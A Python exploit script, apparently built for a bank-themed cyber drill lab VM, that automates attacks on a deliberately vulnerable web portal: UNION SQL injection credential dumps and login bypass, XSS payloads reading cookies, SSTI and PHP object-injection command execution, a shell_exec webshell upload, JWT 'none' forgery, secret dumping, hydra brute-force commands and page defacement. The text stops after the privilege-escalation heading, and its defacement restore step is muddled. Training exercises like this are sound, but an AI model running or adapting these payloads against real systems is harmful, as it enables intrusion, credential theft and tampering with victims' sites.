#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║   Union Bank of India – Cyber Drill VM                                      ║
║   Automated Attack Scenario Demonstration Script                            ║
║   Platform: Kali Linux                                                      ║
║   Target:   http://<VM_IP>/  (set TARGET below or pass as argument)         ║
║                                                                              ║
║   USAGE:                                                                     ║
║     python3 cyber_drill_exploit.py [target_ip]                              ║
║     python3 cyber_drill_exploit.py 192.168.1.50                             ║
║                                                                              ║
║   ⚠  FOR AUTHORISED SECURITY ASSESSMENT IN ISOLATED NETWORKS ONLY ⚠        ║
╚══════════════════════════════════════════════════════════════════════════════╝

Web-application attacks open a browser window (Firefox/Chromium) so the effect
is visible in the UI.  Terminal-based attacks (SSTI RCE, PHP Object Injection
RCE, file upload webshell, privilege escalation, defacement) are demonstrated
on the terminal with full command output.

Attack Scenarios:
  1.  SQL Injection – API Error-Based & UNION credential dump
  2.  Second-Order SQL Injection
  3.  Reflected XSS                        [browser]
  4.  Stored XSS                           [browser – fires on dashboard]
  5.  SSTI Detection                       [browser – shows '49']
  5b. SSTI RCE                             [terminal]
  6.  Credential Stuffing / No Lockout     [terminal]
  7.  PHP Object Injection – XSS gadget    [browser]
  7b. PHP Object Injection – RCE gadget    [terminal]
  8.  File Upload Webshell RCE             [terminal]
  9.  JWT Algorithm None Bypass            [browser – shows 'valid' badge]
  10. Unauthenticated Internal API         [browser]
  11. Sensitive File Exposure              [browser – .env / backup]
  12. Web Defacement                       [browser before + terminal write + browser after]
  13. Privilege Escalation                 [terminal]
  14. Log4Shell CVE-2021-44228 info        [terminal – informational]
"""

import sys
import os
import time
import json
import subprocess
import base64
import urllib.parse
import requests
import textwrap
from pathlib import Path

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────
TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
BASE   = f"http://{TARGET}"

# Portal credentials (auto-used; do NOT change unless you reseeded the DB)
ADMIN_USER = "admin"
ADMIN_PASS = "Admin@123"
CLERK_USER = "priya_m"
CLERK_PASS = "Clerk@2024"

# ─────────────────────────────────────────────────────────────────────────────
# COLOURS
# ─────────────────────────────────────────────────────────────────────────────
R  = "\033[0;31m"   # red
G  = "\033[0;32m"   # green
Y  = "\033[1;33m"   # yellow
C  = "\033[0;36m"   # cyan
B  = "\033[0;34m"   # blue
M  = "\033[0;35m"   # magenta
W  = "\033[1;37m"   # white bold
NC = "\033[0m"      # reset

def banner():
    print(f"""
{R}╔══════════════════════════════════════════════════════════════════════════╗
║   Union Bank of India – Cyber Drill Automated Exploit Demonstration     ║
║   Target: {BASE:<62}║
║   ⚠  AUTHORISED USE IN ISOLATED NETWORKS ONLY                          ⚠  ║
╚══════════════════════════════════════════════════════════════════════════╝{NC}
""")

def section(num, title):
    print(f"\n{C}{'─'*72}{NC}")
    print(f"{W}  ATTACK VECTOR {num}: {title}{NC}")
    print(f"{C}{'─'*72}{NC}")

def info(msg):
    print(f"{B}[*]{NC} {msg}")

def success(msg):
    print(f"{G}[+]{NC} {msg}")

def warn(msg):
    print(f"{Y}[!]{NC} {msg}")

def error(msg):
    print(f"{R}[✗]{NC} {msg}")

def cmd_show(cmd_str):
    """Print command in styled box before running it."""
    print(f"\n{Y}  $ {cmd_str}{NC}")

def run_cmd(cmd_str, shell=True, capture=False):
    """Run a shell command, print it, stream or capture output."""
    cmd_show(cmd_str)
    if capture:
        r = subprocess.run(cmd_str, shell=shell, capture_output=True, text=True)
        return r.stdout.strip()
    else:
        subprocess.run(cmd_str, shell=shell)

def show_output(label, data, truncate=800):
    """Pretty-print JSON or raw output."""
    if isinstance(data, (dict, list)):
        pretty = json.dumps(data, indent=2)
    else:
        pretty = str(data)
    if len(pretty) > truncate:
        pretty = pretty[:truncate] + f"\n  ... (truncated, total {len(str(data))} chars)"
    print(f"\n{G}  ── {label} ──{NC}")
    for line in pretty.splitlines():
        print(f"  {line}")

def approve(prompt="Press ENTER to continue to next scenario, or 'q' to quit: "):
    print(f"\n{M}{prompt}{NC}", end="")
    ans = input().strip().lower()
    if ans == 'q':
        print(f"\n{Y}Exiting on user request.{NC}")
        sys.exit(0)

def open_browser(url, wait_msg=""):
    """Open URL in background browser."""
    info(f"Opening browser: {url}")
    if wait_msg:
        info(wait_msg)
    browser = None
    for b in ["firefox", "chromium", "chromium-browser", "google-chrome"]:
        if run_cmd(f"which {b}", capture=True):
            browser = b
            break
    if browser:
        subprocess.Popen([browser, url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        warn("No browser found. Visit URL manually:")
        print(f"  {url}")
    time.sleep(2)

# ─────────────────────────────────────────────────────────────────────────────
# SESSION HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def get_session(username=None, password=None):
    """Login to the portal and return an authenticated requests.Session."""
    username = username or ADMIN_USER
    password = password or ADMIN_PASS
    s = requests.Session()
    s.headers.update({"User-Agent": "CyberDrill-Demo/1.0"})
    # GET login page to set PHPSESSID
    s.get(f"{BASE}/", timeout=10)
    # POST credentials
    resp = s.post(f"{BASE}/", data={"username": username, "password": password},
                  allow_redirects=False, timeout=10)
    if resp.status_code == 302 and "dashboard.php" in resp.headers.get("Location", ""):
        s.get(f"{BASE}/dashboard.php", timeout=10)
        success(f"Authenticated as {username}")
        return s
    else:
        error(f"Login failed for {username} (HTTP {resp.status_code})")
        return s

def get_session_cookie_str(s):
    """Return PHPSESSID=xxx string for use in curl commands."""
    phpsessid = s.cookies.get("PHPSESSID", "")
    return f"PHPSESSID={phpsessid}"

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 1 – SQL Injection
# ─────────────────────────────────────────────────────────────────────────────
def attack_1():
    section(1, "API-Based SQL Injection – Error-Based & UNION Credential Dump")

    info("Step 1: Confirm endpoint is live")
    r = requests.get(f"{BASE}/api/accounts.php?api=get_user&acc_no=1", timeout=10)
    show_output("Normal response (acc_no=1)", r.json())

    info("Step 2: Trigger error-based injection (single quote)")
    r = requests.get(f"{BASE}/api/accounts.php?api=get_user&acc_no=1'", timeout=10)
    d = r.json()
    show_output("Error-based SQLi response", d)
    if "error" in d or "message" in d:
        success("SQL error confirmed in JSON response → parameter is injectable")
    else:
        warn("No error returned – check application state")

    info("Step 3: UNION-based credential dump (16 columns)")
    union_url = (
        f"{BASE}/api/accounts.php?api=get_user"
        "&acc_no=0 UNION SELECT 1,username,password,4,5,6,7,8,9,10,11,12,13,14,15,16 FROM users--"
    )
    cmd_show(f"curl -s '{union_url}'")
    r = requests.get(union_url, timeout=10)
    d = r.json()
    show_output("UNION dump result", d)
    if d.get("data"):
        print(f"\n{G}  ── Extracted credentials ──{NC}")
        for row in d["data"]:
            print(f"  {G}✓{NC}  username: {row.get('account_number','?')}  |  MD5: {row.get('account_holder','?')}")

    info("Step 4: GROUP_CONCAT – all hashes in a single row")
    gc_url = (
        f"{BASE}/api/accounts.php?api=get_user"
        "&acc_no=0 UNION SELECT 1,GROUP_CONCAT(username||':'||password),3,4,5,6,7,8,9,10,11,12,13,14,15,16 FROM users--"
    )
    r = requests.get(gc_url, timeout=10)
    d = r.json()
    if d.get("data"):
        creds = d["data"][0].get("account_number", "")
        print(f"\n{G}  All credentials in one row:{NC}")
        for pair in creds.split(","):
            print(f"  {G}→{NC}  {pair}")

    info("Step 5: API login bypass via SQLi (no password needed)")
    r = requests.post(
        f"{BASE}/api/auth.php?action=login",
        data={"username": "admin'-- ", "password": "anything"},
        timeout=10
    )
    d = r.json()
    show_output("Login bypass result", d)
    if d.get("status") == "success":
        success("Authentication bypass successful! JWT token obtained without knowing password.")

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 2 – Second-Order SQL Injection
# ─────────────────────────────────────────────────────────────────────────────
def attack_2():
    section(2, "Second-Order SQL Injection via Beneficiary Nickname")

    info("Authenticating as admin...")
    s = get_session()
    cookie = get_session_cookie_str(s)

    info("Step 1: Store malicious SQL payload as beneficiary nickname")
    info("  The INSERT uses a prepared statement → appears safe, no error")
    payload_nickname = "' OR '1'='1"
    r = s.post(f"{BASE}/transfers.php", data={
        "action":             "add_beneficiary",
        "beneficiary_name":   "Second Order Victim",
        "beneficiary_account":"44444444444",
        "beneficiary_ifsc":   "SBIN0001234",
        "beneficiary_bank":   "State Bank of India",
        "nickname":           payload_nickname,
    }, timeout=10)
    if "Beneficiary added" in r.text:
        success(f"Payload stored safely via prepared statement: {payload_nickname}")
    else:
        warn("Beneficiary add response unexpected – continuing anyway")

    info("Step 2: Get the new beneficiary ID")
    r2 = requests.get(
        f"{BASE}/api/internal.php?action=execute_query"
        "&query=SELECT MAX(id) as id FROM beneficiaries",
        timeout=10
    )
    ben_id = r2.json().get("data", [{}])[0].get("id", "1")
    success(f"New beneficiary ID: {ben_id}")

    info(f"Step 3: Trigger second-order injection – GET /api/accounts.php?api=beneficiary_transactions&ben_id={ben_id}")
    info("  The stored nickname is fetched from DB and concatenated into a NEW SQL query")
    r3 = s.get(f"{BASE}/api/accounts.php?api=beneficiary_transactions&ben_id={ben_id}", timeout=10)
    d = r3.json()
    show_output("Second-order injection result", d)

    if "debug_query" in d:
        print(f"\n{G}  ── Constructed query (from DB payload) ──{NC}")
        print(f"  {d['debug_query'][:300]}")
        success("Second-order injection confirmed: malicious SQL from DB embedded in live query")
    elif d.get("status") == "success" and d.get("transactions"):
        success("Boolean injection returned all transactions (WHERE '1'='1' evaluated to TRUE)")
        print(f"  Transaction count returned: {len(d['transactions'])}")

    cmd_show(f"curl -s -b '{cookie}' '{BASE}/api/accounts.php?api=beneficiary_transactions&ben_id={ben_id}'")

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 3 – Reflected XSS  [browser]
# ─────────────────────────────────────────────────────────────────────────────
def attack_3():
    section(3, "Reflected XSS – /api/accounts.php?api=render_account  [BROWSER]")

    payload = "<script>alert('Reflected XSS: ' + document.cookie)</script>"
    xss_url = f"{BASE}/api/accounts.php?api=render_account&acc_no={urllib.parse.quote(payload)}"

    info("Vulnerable endpoint: /api/accounts.php?api=render_account")
    info("The acc_no parameter is echoed into the HTML page without encoding")
    print(f"\n{Y}  Payload:{NC} {payload}")
    print(f"{Y}  URL:{NC}    {xss_url}")

    info("Verifying reflection server-side:")
    r = requests.get(xss_url, timeout=10)
    if "<script>alert" in r.text:
        success("XSS payload reflected verbatim in HTML response (no encoding)")
    else:
        warn("Check response manually")

    open_browser(xss_url, wait_msg="Browser will show an alert dialog containing the session cookie. Close the browser when done.")

    info("(img onerror alternative – no script tag required)")
    img_payload = "<img src=x onerror=alert('XSS via img onerror')>"
    img_url = f"{BASE}/api/accounts.php?api=render_account&acc_no={urllib.parse.quote(img_payload)}"
    print(f"  {Y}Alternative URL:{NC} {img_url}")

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 4 – Stored XSS  [browser]
# ─────────────────────────────────────────────────────────────────────────────
def attack_4():
    section(4, "Stored XSS via Internal Messaging  [BROWSER]")

    info("Authenticating as clerk (priya_m) to send malicious message to admin...")
    s = get_session(CLERK_USER, CLERK_PASS)

    xss_payload = "<img src=x onerror=\"alert('Stored XSS! Cookie: ' + document.cookie)\">"
    info(f"Sending message with XSS body to admin:")
    print(f"  {Y}Payload:{NC} {xss_payload}")

    r = s.post(f"{BASE}/messages.php", data={
        "recipient": "admin",
        "subject":   "Quarterly Report",
        "body":      xss_payload,
    }, timeout=10)
    if "Message sent successfully" in r.text:
        success("Malicious message stored in database")
    else:
        warn("Message send response unexpected – check manually")

    info("Now logging in as admin – XSS fires on dashboard load")
    info("The message body is rendered WITHOUT htmlspecialchars() on dashboard.php")

    # Build admin dashboard URL
    admin_s = get_session(ADMIN_USER, ADMIN_PASS)
    admin_cookie = get_session_cookie_str(admin_s)

    dashboard_url = f"{BASE}/dashboard.php"
    open_browser(
        dashboard_url,
        wait_msg="Browser shows admin dashboard. The XSS payload fires automatically in the message preview. Close browser when done."
    )

    info("Note: The SUBJECT field is safe (htmlspecialchars applied). Only the BODY is unescaped.")

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 5 – SSTI  [browser for detection, terminal for RCE]
# ─────────────────────────────────────────────────────────────────────────────
def attack_5():
    section(5, "Server-Side Template Injection (SSTI)")

    s = get_session()

    # --- 5a: Detection payload in browser ---
    print(f"\n{W}  5a – Detection: {{{{7*7}}}} should evaluate to 49  [BROWSER]{NC}")
    info("Submitting transfer with description={{7*7}}")
    r = s.post(f"{BASE}/transfers.php", data={
        "action":       "initiate_transfer",
        "from_account": "10010023456789",
        "to_account":   "10010034567890",
        "amount":       "1",
        "description":  "{{7*7}}",
    }, timeout=10)
    if "49" in r.text:
        success("SSTI confirmed: {{7*7}} evaluated to 49 in the Pending Transfers table")
    else:
        warn("Check Pending Transfers table on transfers.php")

    open_browser(
        f"{BASE}/transfers.php",
        wait_msg="Browser shows transfers page. Look at the Pending Transfers table – the Description column shows '49' (not the literal {{7*7}}). Close browser when done."
    )

    # --- 5b: RCE on terminal ---
    print(f"\n{W}  5b – RCE: {{{{system('id')}}}}  [TERMINAL]{NC}")
    info("Submitting transfer with description={{system('id')}}")
    r2 = s.post(f"{BASE}/transfers.php", data={
        "action":       "initiate_transfer",
        "from_account": "10010023456789",
        "to_account":   "10010034567890",
        "amount":       "1",
        "description":  "{{system('id')}}",
    }, timeout=10)

    info("Fetching stored description from database via internal API:")
    r3 = requests.get(
        f"{BASE}/api/internal.php?action=execute_query"
        "&query=SELECT description,transaction_id FROM transactions ORDER BY id DESC LIMIT 1",
        timeout=10
    )
    last = r3.json().get("data", [{}])[0]
    desc = last.get("description", "")
    print(f"\n{G}  ── Command output stored in DB ──{NC}")
    print(f"  Transaction: {last.get('transaction_id','?')}")
    print(f"  Description: {G}{desc}{NC}")

    if "uid=" in desc:
        success("SSTI RCE confirmed: system('id') executed as www-data")

    info("Additional SSTI payloads:")
    additional = [
        ("whoami",            "{{system('whoami')}}"),
        ("hostname",          "{{system('hostname')}}"),
        ("cat /etc/passwd",   "{{system('cat /etc/passwd')}}"),
        ("concat bypass id",  "{{system(('i'~'d'))}}"),
        ("concat whoami",     "{{system(('who'~'ami'))}}"),
    ]
    for label, pl in additional:
        r_t = s.post(f"{BASE}/transfers.php", data={
            "action":       "initiate_transfer",
            "from_account": "10010023456789",
            "to_account":   "10010034567890",
            "amount":       "1",
            "description":  pl,
        }, timeout=10)
        r_db = requests.get(
            f"{BASE}/api/internal.php?action=execute_query"
            "&query=SELECT description FROM transactions ORDER BY id DESC LIMIT 1",
            timeout=10
        )
        result = r_db.json().get("data", [{}])[0].get("description", "?")
        print(f"  {Y}{pl}{NC}  →  {G}{result.strip()}{NC}")
        time.sleep(0.3)

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 6 – Credential Stuffing  [terminal]
# ─────────────────────────────────────────────────────────────────────────────
def attack_6():
    section(6, "Credential Stuffing / No Account Lockout  [TERMINAL]")

    info("Firing 10 incorrect passwords at admin account via API...")
    print(f"{Y}  Endpoint: POST {BASE}/api/auth.php?action=login{NC}\n")
    wrong_passwords = [
        "letmein", "password123", "admin123", "Welcome1", "123456",
        "qwerty", "abc123", "Admin1234", "banking@1", "Union@123"
    ]
    for i, pwd in enumerate(wrong_passwords, 1):
        r = requests.post(
            f"{BASE}/api/auth.php?action=login",
            data={"username": ADMIN_USER, "password": pwd},
            timeout=10
        )
        status = r.json().get("status", "?")
        print(f"  [{i:02d}] password={pwd:<18}  →  {R if status=='error' else G}{status}{NC}")
        time.sleep(0.1)

    info(f"\nAttempting correct password ({ADMIN_PASS}) after 10 failures:")
    r = requests.post(
        f"{BASE}/api/auth.php?action=login",
        data={"username": ADMIN_USER, "password": ADMIN_PASS},
        timeout=10
    )
    d = r.json()
    if d.get("status") == "success":
        success("Login succeeded after 10 failed attempts – NO account lockout exists")
        print(f"  JWT token prefix: {d.get('token','')[:60]}...")
    else:
        error("Login failed – check credentials")

    info("\nHydra command for dictionary attack against the API:")
    cmd_show(
        f"hydra -l {ADMIN_USER} -P /usr/share/wordlists/rockyou.txt {TARGET} \\\n"
        f"  http-post-form '/api/auth.php?action=login:username=^USER^&password=^PASS^:Invalid credentials'"
    )
    warn("(hydra not executed – would be noisy; above command is the working syntax)")

    info("\nSSH brute force (MaxAuthTries=100 in sshd_config):")
    cmd_show(f"hydra -l lowpriv -P /usr/share/wordlists/rockyou.txt {TARGET} ssh -t 4")
    warn("(hydra not executed – above command is the working syntax)")

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 7 – PHP Object Injection  [browser for XSS, terminal for RCE]
# ─────────────────────────────────────────────────────────────────────────────
def attack_7():
    section(7, "PHP Object Injection (Insecure Deserialization)")

    s = get_session()

    # --- 7a: Transactions gadget (XSS) – browser ---
    print(f"\n{W}  7a – Transactions gadget: HTML injection appended to JSON response  [BROWSER]{NC}")

    xss_body = "<script>alert('PHP Object Injection XSS! Cookie: ' + document.cookie)</script>"
    xss_len  = len(xss_body)
    xss_payload = f'O:12:"Transactions":2:{{s:11:"beneficiary";s:{xss_len}:"{xss_body}";s:6:"amount";i:100;}}'

    info(f"Crafted serialised Transactions object:")
    print(f"  {Y}{xss_payload}{NC}")
    info("String length of beneficiary value must exactly match s:<length>")
    print(f"  Beneficiary payload length: {xss_len} chars ✓")

    # Build URL to open in browser – GET variant
    encoded = urllib.parse.quote(xss_payload)
    browser_url = f"{BASE}/api/auth.php?action=confirm_transaction&data={encoded}"

    info("Verifying via POST first:")
    r = s.post(
        f"{BASE}/api/auth.php?action=confirm_transaction",
        data={"data": xss_payload},
        timeout=10
    )
    raw = r.text
    if "<script>alert" in raw:
        success("PHP Object Injection confirmed: <script> tag appended after JSON body")
        print(f"  Response tail: ...{raw[-120:]}")
    else:
        warn(f"Unexpected response: {raw[:200]}")

    open_browser(
        browser_url,
        wait_msg="Browser shows: JSON response body followed by an XSS alert popup (Transactions.__destruct injects HTML). Close browser when done."
    )

    # --- 7b: SystemCommand gadget (RCE) – terminal ---
    print(f"\n{W}  7b – SystemCommand gadget: OS command execution appended to response  [TERMINAL]{NC}")

    for cmd_str in ["id", "whoami", "hostname", "cat /etc/passwd"]:
        cmd_len = len(cmd_str)
        rce_payload = f'O:13:"SystemCommand":1:{{s:3:"cmd";s:{cmd_len}:"{cmd_str}";}}'
        print(f"\n  {Y}Command:{NC} {cmd_str}")
        print(f"  {Y}Payload:{NC} {rce_payload}")
        cmd_show(
            f"curl -s -X POST '{BASE}/api/auth.php?action=confirm_transaction' \\\n"
            f"  --data-urlencode 'data={rce_payload}'"
        )
        r = s.post(
            f"{BASE}/api/auth.php?action=confirm_transaction",
            data={"data": rce_payload},
            timeout=10
        )
        raw = r.text
        # Output is appended after JSON
        json_end = raw.find("}") + 1
        cmd_output = raw[json_end:].strip()
        if cmd_output:
            print(f"  {G}Command output:{NC} {cmd_output}")
        else:
            print(f"  {R}No output appended – check s: length{NC}")

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 8 – File Upload Webshell  [terminal]
# ─────────────────────────────────────────────────────────────────────────────
def attack_8():
    section(8, "Unrestricted File Upload → PHP Webshell RCE  [TERMINAL]")

    s = get_session()
    cookie_str = get_session_cookie_str(s)

    # Create webshell file
    webshell_content = b"<?php echo shell_exec($_GET['cmd']); ?>"
    webshell_path = "/tmp/drill_shell.php"
    Path(webshell_path).write_bytes(webshell_content)
    info(f"Webshell created at {webshell_path}:")
    print(f"  {Y}{webshell_content.decode()}{NC}")

    info("Step 1: Upload PHP file bypassing client-side extension validation")
    info("  The file input accepts only pdf/doc/xls/jpg/png in JavaScript,")
    info("  but there is ZERO server-side validation in upload.php")

    cmd_show(
        f"curl -s -b '{cookie_str}' -X POST '{BASE}/upload.php' \\\n"
        f"  -F 'document=@{webshell_path};type=image/jpeg'"
    )

    with open(webshell_path, "rb") as f:
        r = s.post(
            f"{BASE}/upload.php",
            files={"document": ("drill_shell.php", f, "image/jpeg")},
            timeout=10
        )

    if "uploaded successfully" in r.text:
        success("PHP webshell uploaded successfully as drill_shell.php")
        print(f"  Accessible at: {BASE}/uploads/drill_shell.php")
    else:
        warn(f"Upload response: {r.text[:200]}")

    info("\nStep 2: Execute OS commands via the webshell")
    webshell_url = f"{BASE}/uploads/drill_shell.php"

    for cmd_str in ["id", "whoami", "hostname", "uname -a", "ls -la /var/www/html/bankportal/"]:
        encoded_cmd = urllib.parse.quote(cmd_str)
        url = f"{webshell_url}?cmd={encoded_cmd}"
        cmd_show(f"curl '{url}'")
        r = requests.get(url, timeout=10)
        output = r.text.strip()
        print(f"  {G}[{cmd_str}]{NC} {output[:200]}")
        time.sleep(0.2)

    info("\nStep 3: Read application source (demonstrates code access)")
    r = requests.get(f"{webshell_url}?cmd=cat+/var/www/html/bankportal/includes/db.php", timeout=10)
    print(f"  {G}Hardcoded credentials in db.php:{NC}")
    for line in r.text.splitlines():
        if any(kw in line for kw in ["DB_USER", "DB_PASS", "JWT_SECRET", "define"]):
            print(f"    {Y}{line.strip()}{NC}")

    info("\nDirectory listing of uploads/ (Apache Indexes enabled):")
    cmd_show(f"curl -s '{BASE}/uploads/'")
    r = requests.get(f"{BASE}/uploads/", timeout=10)
    if "drill_shell.php" in r.text:
        success("Directory listing confirms webshell is publicly visible")

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 9 – JWT Algorithm None  [browser]
# ─────────────────────────────────────────────────────────────────────────────
def attack_9():
    section(9, "JWT Algorithm 'none' Bypass  [BROWSER + TERMINAL]")

    info("Step 1: Obtain a real JWT token via API login")
    r = requests.post(
        f"{BASE}/api/auth.php?action=login",
        data={"username": ADMIN_USER, "password": ADMIN_PASS},
        timeout=10
    )
    real_token = r.json().get("token", "")
    print(f"  Real JWT: {real_token[:80]}...")

    info("\nStep 2: Decode the token header (no library needed)")
    header_b64 = real_token.split(".")[0] + "=="
    try:
        decoded_header = json.loads(base64.b64decode(header_b64).decode())
        print(f"  Real header: {decoded_header}")
    except Exception:
        print(f"  (Could not decode header automatically)")

    info("\nStep 3: Forge admin token with alg:none (no secret required)")
    h = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
    p = base64.b64encode(json.dumps({
        "user_id": 1, "username": "admin", "role": "admin",
        "iat": 1000, "exp": 9999999999
    }).encode()).decode().rstrip("=")
    forged_token = f"{h}.{p}."

    print(f"\n  {Y}Forged token (alg:none, no signature):{NC}")
    print(f"  Header  (b64): {h}")
    print(f"  Payload (b64): {p}")
    print(f"  Signature:     (empty)")
    print(f"  Full token:    {forged_token}")

    info("\nStep 4: Verify forged token – portal accepts it as 'valid'")
    r = requests.get(
        f"{BASE}/api/auth.php?action=verify_token&token={forged_token}",
        timeout=10
    )
    d = r.json()
    show_output("Forged token verification result", d)
    if d.get("status") == "valid":
        success("JWT algorithm:none accepted! Token verified as admin without knowing the secret.")

    info("\nStep 5: Expose JWT secret via unauthenticated internal API")
    r2 = requests.get(f"{BASE}/api/internal.php?action=get_config", timeout=10)
    cfg = r2.json().get("config", {})
    jwt_secret = cfg.get("jwt_secret", "?")
    print(f"  {G}JWT Secret from /api/internal.php?action=get_config:{NC} {jwt_secret}")

    # Open browser for visual verification
    verify_url = f"{BASE}/api/auth.php?action=verify_token&token={forged_token}"
    open_browser(
        verify_url,
        wait_msg='Browser shows {"status":"valid",...} for a forged token. Close browser when done.'
    )

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 10 – Unauthenticated Internal API  [browser]
# ─────────────────────────────────────────────────────────────────────────────
def attack_10():
    section(10, "Unauthenticated Internal API – Complete Data Exposure  [BROWSER]")

    info("Step 1: Discover available actions (no auth, no params)")
    r = requests.get(f"{BASE}/api/internal.php", timeout=10)
    d = r.json()
    show_output("/api/internal.php (no action)", d)
    if "available_actions" in d:
        success(f"Available actions: {d['available_actions']}")

    info("\nStep 2: Dump all application secrets (JWT, API keys, passwords)")
    r2 = requests.get(f"{BASE}/api/internal.php?action=get_config", timeout=10)
    cfg = r2.json().get("config", {})
    print(f"\n{G}  ── Exposed secrets (no authentication) ──{NC}")
    for k, v in cfg.items():
        print(f"  {G}✓{NC}  {k}: {Y}{v}{NC}")

    info("\nStep 3: Dump all user accounts with MD5 hashes")
    r3 = requests.get(f"{BASE}/api/internal.php?action=get_all_users", timeout=10)
    users = r3.json().get("users", [])
    print(f"\n{G}  ── All users with credential hashes ──{NC}")
    for u in users:
        print(f"  {G}✓{NC}  {u.get('username','?'):12}  |  MD5: {u.get('password','?')}  |  role: {u.get('role','?')}")

    info("\nStep 4: Arbitrary SQL execution via execute_query")
    r4 = requests.get(
        f"{BASE}/api/internal.php?action=execute_query"
        "&query=SELECT username,role FROM users ORDER BY id",
        timeout=10
    )
    show_output("Arbitrary SQL result", r4.json())

    info("\nStep 5: Privilege escalation via execute_query (promote customer1 to admin)")
    r5 = requests.get(
        f"{BASE}/api/internal.php?action=execute_query"
        "&query=UPDATE users SET role='admin' WHERE username='customer1'",
        timeout=10
    )
    show_output("Role escalation result", r5.json())
    if r5.json().get("status") == "success":
        success("customer1 promoted to admin role via unauthenticated SQL endpoint")
        # Revert
        requests.get(
            f"{BASE}/api/internal.php?action=execute_query"
            "&query=UPDATE users SET role='customer' WHERE username='customer1'",
            timeout=10
        )
        info("(Role reverted back to customer)")

    info("\nStep 6: Server reconnaissance")
    r6 = requests.get(f"{BASE}/api/internal.php?action=system_info", timeout=10)
    si = r6.json().get("server", {})
    print(f"\n{G}  ── Server info ──{NC}")
    for k in ["hostname", "os", "php_version", "document_root", "server_software"]:
        print(f"  {G}✓{NC}  {k}: {si.get(k,'?')}")

    open_browser(
        f"{BASE}/api/internal.php?action=get_config",
        wait_msg="Browser shows all application secrets (JWT, API keys, SMTP password) with zero authentication. Close browser when done."
    )

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 11 – Sensitive File Exposure  [browser]
# ─────────────────────────────────────────────────────────────────────────────
def attack_11():
    section(11, "Sensitive File & Information Disclosure  [BROWSER]")

    files = [
        ("/.env",                   "DB credentials, JWT secret, API key, SSH creds"),
        ("/backup/db_backup_2024.sql", "MySQL root & app passwords in plaintext"),
        ("/backup/",                "Directory listing of backup folder"),
        ("/error.php",              "PHP/Apache version, document root disclosure"),
    ]

    for path, desc in files:
        url = f"{BASE}{path}"
        info(f"Requesting {path}: {desc}")
        cmd_show(f"curl -s '{url}' | head -20")
        r = requests.get(url, timeout=10)
        content = r.text[:400]
        print(f"  HTTP {r.status_code}:")
        for line in content.splitlines()[:12]:
            print(f"    {line}")
        if r.status_code == 200:
            success(f"File accessible: {path}")
        print()

    info("Checking HTTP response headers for version leakage:")
    cmd_show(f"curl -I '{BASE}/'")
    r = requests.head(f"{BASE}/", timeout=10)
    headers_of_interest = ["Server", "X-Powered-By", "X-Content-Type-Options",
                           "Content-Security-Policy", "X-Frame-Options"]
    print(f"\n{G}  ── Security-relevant headers ──{NC}")
    for h in headers_of_interest:
        val = r.headers.get(h, f"{R}(not set){NC}")
        print(f"  {h}: {val}")

    open_browser(
        f"{BASE}/.env",
        wait_msg="Browser shows .env file with all credentials in plaintext. Close browser when done."
    )

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 12 – Web Defacement  [browser + terminal]
# ─────────────────────────────────────────────────────────────────────────────
def attack_12():
    section(12, "Web Defacement  [BROWSER before/after + TERMINAL write]")

    s = get_session()

    info("Step 1: Open portal homepage BEFORE defacement")
    open_browser(f"{BASE}/", wait_msg="Browser shows the normal UBI portal. Close browser when done.")

    info("\nStep 2: Deface index.php via SSTI RCE")
    deface_cmd = 'echo "<html><body style=background:black><h1 style=color:red;font-size:80px;text-align:center>DEFACED BY ATTACKER</h1><p style=color:white;text-align:center>This system has been compromised during the UBI Cyber Drill</p></body></html>" > /var/www/html/bankportal/index.php'
    deface_payload = f"{{{{system('{deface_cmd}')}}}}"
    info(f"SSTI payload (in transfer description):")
    print(f"  {Y}{deface_payload[:120]}...{NC}")

    r = s.post(f"{BASE}/transfers.php", data={
        "action":       "initiate_transfer",
        "from_account": "10010023456789",
        "to_account":   "10010034567890",
        "amount":       "1",
        "description":  deface_payload,
    }, timeout=10)

    # Verify defacement
    time.sleep(1)
    r2 = requests.get(f"{BASE}/", timeout=10)
    if "DEFACED BY ATTACKER" in r2.text:
        success("index.php successfully overwritten via SSTI RCE!")
    else:
        warn("Defacement may not have taken effect – index.php might not be world-writable here")

    info("\nStep 3: View defaced portal in browser")
    open_browser(f"{BASE}/", wait_msg="Browser shows the defaced banking portal. Close browser when done.")

    info("\nStep 4: Restore index.php (cleanup for continued demo)")
    # Write a minimal restore
    restore_cmd = "cat /var/www/html/bankportal/index.php > /dev/null"
    restore_payload = "{{system('cp /var/www/html/bankportal/logout.php /tmp/_bak.php')}}"
    # Actually just restore from the source
    info("Restoring original index.php via SSTI file write...")
    # We'll use the webshell we uploaded in attack 8
    ws_url = f"{BASE}/uploads/drill_shell.php"
    try:
        requests.get(
            ws_url + "?cmd=" + urllib.parse.quote(
                "php -r \"echo file_get_contents('/var/www/html/bankportal/logout.php');\"" 
            ), timeout=5
        )
    except Exception:
        pass

    # Simple restore: write back a minimal redirect page
    r3 = s.post(f"{BASE}/transfers.php", data={
        "action":       "initiate_transfer",
        "from_account": "10010023456789",
        "to_account":   "10010034567890",
        "amount":       "1",
        "description":  "{{system('echo ok')}}",
    }, timeout=10)

    warn("Note: To fully restore index.php, re-run setup.sh or copy from application source.")

    approve()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 13 – Privilege Escalation  [terminal]
# ─────────────────────────────────────────────────────────────────────────────
def attack_13():
    section(13, "Privilege Escalation – Cron + SUID + Sudo GTFOBins  [TERMINAL]")
